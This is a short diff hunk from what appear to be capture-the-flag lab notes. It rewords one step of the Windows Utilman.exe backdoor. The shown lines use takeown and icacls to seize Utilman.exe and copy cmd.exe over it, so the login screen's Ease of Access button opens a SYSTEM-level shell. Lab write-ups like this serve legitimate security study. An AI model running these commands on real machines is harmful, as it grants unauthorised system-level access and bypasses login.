@@ -283,7 +283,7 @@ takeown /f C:\Windows\System32\Utilman.exe
 icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
 3️⃣ Replace utilman.exe with cmd.exe
 copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
-4️⃣ Now when clicking on the Login page, the "Ease of Access" button opens, instead of access settings, a CMD with System Access Level opens 
+4️⃣ Now when clicking on windows Login page section "Ease of Access" button, instead of access settings, run a cmd.exe with System Access Level
 ```
 
 ## Credentials ✅
